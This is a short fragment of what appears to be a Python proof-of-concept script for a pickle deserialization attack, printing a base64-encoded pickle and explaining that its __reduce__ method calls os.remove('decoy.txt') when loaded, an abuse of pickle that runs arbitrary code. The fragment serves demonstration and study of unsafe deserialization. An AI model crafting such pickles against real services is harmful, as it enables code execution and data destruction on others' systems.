print("\n[*] Base64 encoded pickle:")
print(b64_data)

print("\n[*] Payload details:")
print(f"Size: {len(pickle_data)} bytes")
print(f"__reduce__ returns: (os.remove, ('decoy.txt',))")
print(f"Effect when deserialized: os.remove('decoy.txt') executes")
print("\nMechanism: The __reduce__ method tells pickle how to reconstruct")
print("the object, but we abuse it to execute arbitrary code instead.")
